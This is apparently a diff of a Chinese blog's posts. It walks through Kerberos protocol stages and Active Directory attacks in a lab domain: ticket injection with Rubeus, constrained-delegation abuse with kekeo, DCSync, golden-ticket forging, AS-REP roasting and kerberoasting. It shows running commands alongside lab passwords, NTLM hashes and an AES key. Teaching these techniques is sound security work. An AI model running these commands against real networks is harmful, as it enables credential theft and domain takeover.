+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIE+jCCBPagAwIBBaEDAgEWooIEETCCBA1hggQJMIIEBaADAgEFoQ8bDVJFRFRFQU0uTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDVJFRFRFQU0uTE9DQUyjggPHMIIDw6ADAgEXoQMCAQKiggO1BIIDsTRd7H8nT8n2+xhFjdYxWkeGwWptrnyKLgxn746x3g+68Wa92RV8mkudwvNSHPEbhA05tXVs62KwV/TjlhSHcjW9U8KfzgGdJpcpF8JrbW+X0ON4J0SyuwtcubsOiulJ6yiyH4riFlMTcl6TXMdbWCnOwIriPfOnQP/jtkcZWx2J27Y2HZ8cCAL00aV14S+ajcA65Howkx1/0ts+YQVZhFpc6l9fFQfGp9R87CjPNpWXEJV0iUGSELptTfXTxNSr/oF3+G7U0KrNl+9NMjloU6tFy/gnmc1PbDnUNXYgdKssUvxUpBzfVxq7leBkX1chx91kPcRrqAZC+tUWSoyULTkCPB8OcYY2DwHy4ElaQbo3y1mmq2DtHTx/ulGvwfKbpQrDgVSKZjE7VGdQSD7eAUJB7Pbu+lHsPc30DLVIbxJEQlC7WRKi1tNc6mhQJtAEGQFUUdYSQNtvNpiphZEfNGUoPaTz/9QspD9jjyVv+Dm7lqup5ojDSAxxc0Gzg61c4KmW3pJlmVQaN4f9Of+LeuqR3tR5EWxPqmkTgv1eVwdGryiF0cNC5Q7SAxrr6mgL2pL2HpMMILwhLSWlk0YIt6qdlyhRRdBzgopSzN5yB3IkSK4RXAF4CFYbximorzkIa9jG34ge9FlSVRkjUxNXb5KnCTDhLymT3F3tJeZoGig4Q+O9pfuUutsuxzSsy8u6xuuXkvg//LuXvDDOuVbOuKHR05tPfc1f9nKqs/YclidoYN3Nf/51pgF4n0ZXieHu5hgZYhb//qKh1X51ezI0MQ1gwkmssF9724s0U1QcLIS4ts3XxPCaDfuOeOLJUoMyqt0BdvYdVn6uGl0b2kCYwtk8ouIfuBbGeSYyGcSo+//tyTNJL57TCy42wRkFecRDdsBrRP8Je46fHBDPp7dhfOwP29Yt4nHFEtCKmjNeYLKQmQnKJ2i4AJKkOyi3QYPcf8Q+uzgU8c5V4p8kj+YBtvUMKQx6Dy1+MTfFz3tY1pQ7KB2pHziop/mm1f6ZPXNtoqcrtlCL+YGDEtgAPxSqaf3eAUhXar39qpUV1ey2Y7Pv/NZg8NevdUUG83LVXIiHHbwGTPBQgccrg9qC0cGHEHs0TNy7cLKc/8s86ZCzvBffmp/Q77QKZIH6jwvxopDjnO0s5jE9F7DVqBK51AWtPuSufXbOTqNMih90jxDJrb9cOZsIqadS7K6fJK232uUHCqSBP4H7QORFRPsCV6YFR13uzFutz+zN59+Y76NUrmhkqqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEFo/U0fj+283YVzNrDWB7b+hDxsNUkVEVEVBTS5MT0NBTKIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIxMTAwMzEyNDAzMlqmERgPMjAyMTEwMDMyMjQwMjlapxEYDzIwMjExMDEwMTI0MDI5WqgPGw1SRURURUFNLkxPQ0FMqSIwIKADAgECoRkwFxsGa3JidGd0Gw1SRURURUFNLkxPQ0FM</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再Rubeus导入base64的票据直接注入进内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:base64</span><br></pre></td></tr></table></figure>
+
+<p>可以klist看到票据已经导入成功</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIEBs.png" alt="wXIEBs.png"></p>
+<p>然后就可以直接dcsync</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:redteam.local /all /csv</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXIYJ7.png" alt="wXIYJ7.png"></p>
+<h2 id="0x03-约束性委派"><a href="#0x03-约束性委派" class="headerlink" title="0x03 约束性委派"></a>0x03 约束性委派</h2><p>操作环境：</p>
+<blockquote>
+<p>域：redteam.local</p>
+<p>域控：DC.redteam.local。主机名：DC。ip：192.168.11.16</p>
+<p>域管账户：Administrator/test123..</p>
+<p>域内机器：MSSQL.redteam。ip：192.168.11.8。普通账户：hack/test123..</p>
+</blockquote>
+<p><strong>前提：</strong>在服务A上配置到服务B约束性委派(域管理员才有权限配置)</p>
+<p>1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A</p>
+<p>2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据，</p>
+<p>3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。</p>
+<p>从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
+<p>在kerberos协议里面存在两个拓展子协议S4u2seflt和S4u2Proxy。服务账号只能获取用户的TGS，这个时候就只能模拟用户访问特定的服务。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIwmG.png" alt="wXIwmG.png"></p>
+<p>当被配置了约束委派的账户的userAccountControl属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性还会指定对哪个SPN进行委派。</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIfay.png" alt="wXIfay.png"></p>
+<h3 id="3-1-筛选约束性委派账号"><a href="#3-1-筛选约束性委派账号" class="headerlink" title="3.1 筛选约束性委派账号"></a>3.1 筛选约束性委派账号</h3><h4 id="3-1-1-ldapsearch"><a href="#3-1-1-ldapsearch" class="headerlink" title="3.1.1 ldapsearch"></a>3.1.1 ldapsearch</h4><p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-1-2-FuckLdap"><a href="#3-1-2-FuckLdap" class="headerlink" title="3.1.2 FuckLdap"></a>3.1.2 FuckLdap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FuckLdap.exe -d 192.168.11.16 -u hack -p test123.. --Checkdelegation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIGaM.png" alt="wXIGaM.png"></p>
+<h3 id="3-2-约束性委派攻击"><a href="#3-2-约束性委派攻击" class="headerlink" title="3.2 约束性委派攻击"></a>3.2 约束性委派攻击</h3><p>我们这里设置了MSSQL这个机器用户对DC的cifs服务的委派。</p>
+<p>当我们要进行约束委派攻击的前提就是拿到这台启用了约束委派的机器权限。</p>
+<p><strong>生成TGT</strong></p>
+<p>首先生成TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:MSSQL$ /domain:redteam.local /NTLM:29de42b31e2b7961fda4fbe648d062c9&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获得ST</strong></p>
+<p>使用这张TGT通过伪造s4U请求以administrator用户身份请求去访问DC的cifs的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_MSSQL$@REDTEAM.LOCAL_krbtgt~redteam.local@REDTEAM.LOCAL.kirbi /user:Administrator@redteam.local /service:cifs/DC.redteam.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的DC CIFS服务的ST2会保存在当前目录下</p>
+<p><strong>注入ST2</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@redteam.local@REDTEAM.LOCAL_cifs~DC.redteam.local@REDTEAM.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后访问域控</p>
+<p><img src="https://t1.picb.cc/uploads/2021/10/03/wXIHEt.png" alt="wXIHEt.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/" itemprop="url">kerberos协议及问题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-03T20:09:25+08:00">
+                2021-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="kerberos协议及其漏洞"><a href="#kerberos协议及其漏洞" class="headerlink" title="kerberos协议及其漏洞"></a>kerberos协议及其漏洞</h1><table>
+<thead>
+<tr>
+<th>DC</th>
+<th>域控</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>KDC</td>
+<td>密钥分发中心，由域控担任</td>
+</tr>
+<tr>
+<td>AD</td>
+<td>活动目录，里面包含域内用户数据库</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>AS</th>
+<th>Kerberos认证服务</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TGT</td>
+<td>TGT认证权证，由AS服务发放</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>票据授予服务</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>ST</th>
+<th>ST服务票据，由TGS服务发送</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/9713cb3ac91af7a8.png"></p>
+<p><strong>krbtgt</strong> 用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/0c344c9cb8554144.png"></p>
+<p>域控(server08):192.168.3.142</p>
+<p>server08：192.168.3.68</p>
+<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h1><p>客户端向KDC的AS认证服务请求TGT认证权证。TGT是KDC的AS认证服务发放的</p>
+<p>1、<strong>AS-REQ</strong>：当域内某个用户试图访问域中的某个服务，于是输入用户名和密码，本机的Kerberos服务会向KDC的AS认证服务发送一个AS-REQ认证请求。该请求包中包含： <strong>请求的用户名</strong>、<strong>客户端主机名、加密类型</strong> 和 <strong>Authenticator(用户NTLM Hash加密的时间戳</strong>) 以及一些其他信息。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/055c3962928ed710.png"></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/90cf7dbe39736038.png"><img src="https://i.bmp.ovh/imgs/2021/10/6976e4ec9c3a2e0a.png"></p>
+<h2 id="AS-REQ阶段产生的攻击方式"><a href="#AS-REQ阶段产生的攻击方式" class="headerlink" title="AS-REQ阶段产生的攻击方式"></a>AS-REQ阶段产生的攻击方式</h2><h3 id="1-HASH传递"><a href="#1-HASH传递" class="headerlink" title="1.HASH传递"></a>1.HASH传递</h3><p>在AS-REQ阶段，是用用户密码Hash加密的Authenticator，所以也就造成了hash传递</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/e4366b8796f758ec.png"></p>
+<p>只适用于域环境，并且目标主机需要安装 KB2871997补丁 PTK</p>
+<h3 id="2-域内用户枚举"><a href="#2-域内用户枚举" class="headerlink" title="2.域内用户枚举"></a>2.域内用户枚举</h3><p>AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。user.txt不需要加上@0day.org，也可以使用udp</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/714224d0713ec9a5.png"></p>
+<h3 id="3-密码喷洒"><a href="#3-密码喷洒" class="headerlink" title="3.密码喷洒"></a>3.密码喷洒</h3><p>并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率</p>
+<p>针对明文：</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/5d1d3364fafc0134.png"></p>
+<p>针对ntlm hash：</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/d1197ea83668cff7.png"></p>
+<h1 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h1><p>2、<strong>AS-REP</strong>：当KDC接收到请求之后，通过AD活动目录查询得到该用户的密码Hash，用该密码Hash对请求包的Authenticator进行解密，如果解密成功，则证明请求者提供的密码正确，而且需要时间戳范围在五分钟内，且不是重放，于是预认证成功。KAS成功认证对方的身份之后，发送响应包给客户端。响应包中主要包括：<strong>krbtgt用户的NTLM Hash加密后的TGT认购权证(<strong>即ticket这部分</strong>)</strong> 和 <strong>用户NTLM Hash加密的Login Session key(<strong>即最外层 enc-part 这部分</strong>)</strong> 以及一些其他信息。该Login Session Key的作用是用于确保客户端和KDC下阶段之间通信安全。最后TGT认购权证、加密的Lgoin Session Key、时间戳 和 PAC等信息会发送给客户端。PAC中包含用户的SID，用户所在的组等一些信息。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/ee6c941a64f195b9.png"></p>
+<p>在enc-part里面最重要的字段是Login session key，作为下阶段的认证密钥。</p>
+<p>AS-REP中最核心的东西就是 Login session-key 和 加密的ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用mimikatz，kekeo，rubeus生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是Login session-key 和 加密的 ticket，因此可以相互转化。</p>
+<h2 id="AS-REP阶段产生的攻击方式"><a href="#AS-REP阶段产生的攻击方式" class="headerlink" title="AS-REP阶段产生的攻击方式"></a>AS-REP阶段产生的攻击方式</h2><h3 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="1.黄金票据"></a>1.黄金票据</h3><p>在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个TGT认购权证，这就造成了黄金票据攻击</p>
+<p>伪造黄金票据的前提：</p>
+<ul>
+<li><p>要伪造的域用户(这里我们一般填写域管理员账户)</p>
+</li>
+<li><p>域名</p>
+</li>
+<li><p>域的SID值(就是域成员SID值去掉最后的)</p>
+</li>
+<li><p>krbtgt账号的哈希值或AES-256值</p>
+</li>
+</ul>
+<p><strong>1.使用mimikatz</strong></p>
+<p>先获取krbtgt hash：</p>
+<p>在域控执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:0day.org /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到如下信息：</p>
+<p>sid：S-1-5-21-1812960810-2335050734-3517558805</p>
+<p>ntlm hash：36f9d9e6d98ecf8307baf4f46ef842a2</p>
+<p>aes256：dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9</p>
+<p>伪造用户administrator执行(aes256)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span><br><span class="line">/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /user:administrator</span><br><span class="line">/ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>伪造用户administrator执行(krbtgt hash)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span><br><span class="line">/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /user:administrator /ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>生成文件gold.kirbi</p>
+<p>导入Golden Ticket，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\jack.0DAY\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>获得域控权限</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/524193ce037eecda.png"></p>
+<p><strong>注意这里格式只能是 主机名.域名 的形式，而不能写ip</strong></p>
+<p><strong>2.使用impacket</strong></p>
+<p>这里使用kali，不在域内只需要把dns改为域控即可</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/a2e6129a5604fa0f.png"></p>
+<p>先生成票据administrator.ccache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -domain-sid S-1-5-21-1812960810-2335050734-3517558805 -nthash 36f9d9e6d98ecf8307baf4f46ef842a2 -domain 0day.org administrator</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>然后在访问域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/8d6034ac90a7ac68.png"></p>
+<h3 id="2-AS-REP-Roasting"><a href="#2-AS-REP-Roasting" class="headerlink" title="2.AS-REP Roasting"></a>2.AS-REP Roasting</h3><p>在AS-REP阶段，最外层的 enc-part 是用用户密码 Hash 加密的。对于域用户，如果设置了选项” Do not require Kerberos preauthentication”，此时向域控制器的 88 端口发送 AS_REQ 请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户 hash 加密的 Login Session Key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令，这就造成了 AS-REP Roasting攻击。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/7e0ab0fc431debdf.png"></p>
+<p>默认这个功能是不启用的，如果启用AS-REP会返回用户hash加密的sessionkey-as，这样我们就可以用john离线破解</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/8d064497a3dc6983.png"></p>
+<p>使用Empire下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/b8e837d21b3bae34.png"></p>
+<p>使用ASREPRoast.ps1获取AS-REP返回的Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName jack -Domain 0day.org | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/6ea757bc36cb287f.png"></p>
+<p>修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/546bc32014e7885e.png"></p>
+<h1 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS-REQ"></a>TGS-REQ</h1><p>经过上面的步骤，客户端获得了 TGT认购权证 和 Login Session Key。然后用自己的密码NTLM Hash解密Login Session Key得到 原始的Logon Session Key。然后它会在本地缓存此 TGT认购权证 和 原始的Login Session Key。如果现在它需要访问某台服务器的某个服务，它就需要凭借这张TGT认购凭证向KDC购买相应的入场券<strong>ST服务票据（Service Ticket）。</strong>ST服务票据是通过KDC的另一个服务 <strong>TGS（Ticket Granting Service）</strong>出售的。在这个阶段，微软引入了两个扩展自协议 S4u2self 和 S4u2Proxy(当委派的时候，才用的到)</p>
+<p>3、<strong>TGS-REQ</strong>：客户端向KDC购买针对指定服务的ST服务票据请求，该请求主要包含如下的内容：<strong>客户端信息、Authenticator(Login Session Key加密的时间戳)、TGT认购权证(padata下ap-req下的ticket) 和 访问的服务名</strong> 以及一些其他信息 。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/ad2ffcab4db55ba5.png"></p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/51995ef830c2e221.png"></p>
+<h1 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h1><p>4.、TGS-REP：TGS接收到请求之后，首先会检查自身是否存在客户端所请求的服务。如果服务存在，则通过 krbtgt 用户的NTLM Hash 解密TGT并得到Login Session Key，然后通过Login Session Key解密Authenticator，如果解密成功，则验证了对方的真实身份，同时还会验证时间戳是否在范围内。并且还会检查TGT中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同。在完成上述的检测后，如果验证通过，则TGS完成了对客户端的认证，会生成一个用Logon Session Key加密后的用于确保客户端-服务器之间通信安全的Service Session Key会话秘钥(也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据 发送给客户端。(这一步不管用户有没有访问服务的权限，只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据)</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/9d627cd1f134b5d0.png"></p>
+<p>enc-part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击</p>
+<h2 id="TGS-REP阶段产生的攻击方式"><a href="#TGS-REP阶段产生的攻击方式" class="headerlink" title="TGS-REP阶段产生的攻击方式"></a>TGS-REP阶段产生的攻击方式</h2><h3 id="1-Kerberoast攻击"><a href="#1-Kerberoast攻击" class="headerlink" title="1.Kerberoast攻击"></a>1.Kerberoast攻击</h3><p>Kerberoast攻击过程：</p>
+<p>1.攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证 ，该TGT认购权证用于以后的ST服务票据请求</p>
+<p>2.攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。 在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。</p>
+<p>3.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。 然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。 ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。 ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。</p>
+<p>4.攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p>
+<p><strong>首先是请求服务票据</strong></p>
+<p>1.Rubeus.exe请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
+
+<p>Rubeus里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，然后直接打印出能使用 hashcat 或 john 爆破的Hash。 以下的命令会打印出注册于用户下的所有SPN的服务票据的hashcat格式。</p>
+<p><img src="https://i.bmp.ovh/imgs/2021/10/858eaba8b2f0962e.png"></p>
+<p>2.powershell请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#请求服务票据</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br><span class="line">#列出服务票据</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/b8b09866625fa46c.png"></p>
+<p>3.mimikatz请求</p>
+<p>请求指定SPN的服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#请求服务票据</span><br><span class="line">kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433 </span><br><span class="line">#列出服务票据</span><br><span class="line">kerberos::list  </span><br><span class="line">#清除所有票据</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p>4.Impacket中的GetUserSPNS.py请求</p>
+<p>该脚本可以请求注册于用户下的所有SPN的服务票据。使用该脚本需要提供域账号密码才能查询。该脚本直接输出hashcat格式的服务票据，可用hashcat直接爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 192.168.200.143 0day.org/jack</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.bmp.ovh/imgs/2021/10/edb14e7b7bd115e5.png"></p>
+<p>这里输入jack的密码</p>
+<p><strong>导出票据</strong></p>
+<p>首先是查看</p>
